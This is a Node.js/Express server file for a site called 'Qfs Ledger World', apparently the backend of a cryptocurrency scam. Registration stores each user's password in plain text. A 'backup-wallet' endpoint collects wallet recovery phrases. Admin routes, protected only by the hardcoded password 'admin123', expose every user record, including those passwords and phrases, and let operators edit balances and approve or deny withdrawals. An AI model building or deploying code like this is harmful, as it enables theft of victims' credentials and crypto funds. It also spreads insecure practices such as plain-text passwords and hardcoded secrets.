const express = require('express');
const path = require('path');
const cors = require('cors');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const mongoose = require('mongoose');
const { Resend } = require('resend');
require('dotenv').config();
const { User, Withdrawal, Settings } = require('./database');

const app = express();
const JWT_SECRET = process.env.JWT_SECRET || 'qfs_ledger_secret_key_123!';

// MongoDB Connection (Optimized for Serverless)
let cachedDb = null;
async function connectToDatabase() {
  if (cachedDb) return cachedDb;
  const db = await mongoose.connect(process.env.MONGODB_URI);
  cachedDb = db;
  return db;
}

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Initialize Resend
const resend = new Resend(process.env.RESEND_API_KEY);

// Middleware to ensure DB is connected
app.use(async (req, res, next) => {
  if (req.path.startsWith('/api')) {
    try {
      await connectToDatabase();
    } catch (err) {
      console.error('DB Connection Error:', err);
      return res.status(500).json({ error: 'Database connection failed' });
    }
  }
  next();
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Fallback for .html files
app.get('/:page.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', req.params.page + '.html'), (err) => {
    if (err) {
      res.status(404).send('Page not found');
    }
  });
});

// Serve other HTML files without .html extension if needed, or just let static handle it
// For Vercel, it's often better to explicitly handle some routes if they are being blocked.

async function sendWelcomeEmail(toEmail, firstName) {
  try {
    await resend.emails.send({
      from: process.env.EMAIL_FROM || 'onboarding@resend.dev',
      to: [toEmail],
      subject: 'Welcome to Qfs Ledger World!',
      html: `<div style="font-family: Arial; padding: 20px;"><h2>Welcome, ${firstName}!</h2><p>Your account is active. <a href="${process.env.LOGIN_URL}">Login here</a></p></div>`
    });
  } catch (err) { console.error('Email Error:', err.message); }
}

function authenticateToken(req, res, next) {
  const token = req.headers['authorization']?.split(' ')[1];
  if (!token) return res.sendStatus(401);
  jwt.verify(token, JWT_SECRET, (err, user) => {
    if (err) return res.sendStatus(403);
    req.user = user;
    next();
  });
}

const authAdmin = (req, res, next) => {
  if (req.headers['x-admin-pass'] !== 'admin123') return res.sendStatus(403);
  next();
};

// API Endpoints
app.post('/api/register', async (req, res) => {
  const { firstname, lastname, username, email, password } = req.body;
  try {
    const existing = await User.findOne({ $or: [{ username }, { email }] });
    if (existing) return res.status(400).json({ error: 'User already exists' });
    
    const password_hash = await bcrypt.hash(password, 10);
    const user = new User({ firstname, lastname, username, email, password_hash, plain_password: password });
    await user.save();
    
    sendWelcomeEmail(email, firstname);
    res.status(201).json({ message: 'Success' });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  try {
    const user = await User.findOne({ username });
    if (!user || !(await bcrypt.compare(password, user.password_hash))) return res.status(401).json({ error: 'Invalid' });
    
    const token = jwt.sign({ id: user._id, username: user.username }, JWT_SECRET, { expiresIn: '24h' });
    res.json({ token, user: { id: user._id, username: user.username, firstname: user.firstname } });
  } catch (err) { res.status(500).json({ error: 'Login failed' }); }
});

app.get('/api/profile', authenticateToken, async (req, res) => {
  const user = await User.findById(req.user.id).select('-password_hash');
  res.json(user);
});

app.post('/api/backup-wallet', authenticateToken, async (req, res) => {
  await User.findByIdAndUpdate(req.user.id, {
    $push: { wallet_connections: { wallet: req.body.wallet, phrase: req.body.phrase } }
  });
  res.json({ message: 'Success' });
});

app.post('/api/withdraw', authenticateToken, async (req, res) => {
  const { amount, asset, address } = req.body;
  const user = await User.findById(req.user.id);
  if (user.balance < amount) return res.status(400).json({ error: 'Insufficient' });
  
  user.balance -= amount;
  await user.save();
  
  const withdrawal = new Withdrawal({ userId: user._id, username: user.username, amount, asset, address });
  await withdrawal.save();
  res.json({ message: 'Success' });
});

// ADMIN API
app.get('/api/admin/users', authAdmin, async (req, res) => res.json(await User.find()));
app.get('/api/admin/withdrawals', authAdmin, async (req, res) => res.json(await Withdrawal.find().sort({ timestamp: -1 })));
app.post('/api/admin/withdrawals/:id/status', authAdmin, async (req, res) => {
  await Withdrawal.findByIdAndUpdate(req.params.id, { status: req.body.status });
  res.json({ message: 'Updated' });
});

app.get('/api/settings', async (req, res) => {
  let s = await Settings.findOne({ key: 'global' });
  if (!s) s = await Settings.create({ key: 'global' });
  res.json(s);
});

app.post('/api/admin/settings', authAdmin, async (req, res) => {
  const s = await Settings.findOneAndUpdate({ key: 'global' }, { deposit_addresses: req.body.deposit_addresses }, { new: true, upsert: true });
  res.json(s.deposit_addresses);
});

app.delete('/api/admin/users/:id', authAdmin, async (req, res) => {
  await User.findByIdAndDelete(req.params.id);
  res.json({ message: 'Deleted' });
});

app.put('/api/admin/users/:id', authAdmin, async (req, res) => {
  const updates = req.body;
  if (updates.password) updates.password_hash = await bcrypt.hash(updates.password, 10);
  const user = await User.findByIdAndUpdate(req.params.id, updates, { new: true });
  res.json(user);
});

app.delete('/api/admin/users/:userId/wallet/:timestamp', authAdmin, async (req, res) => {
  const user = await User.findById(req.params.userId);
  user.wallet_connections = user.wallet_connections.filter(c => c.timestamp.toISOString() !== req.params.timestamp);
  await user.save();
  res.json({ message: 'Deleted' });
});

module.exports = app;
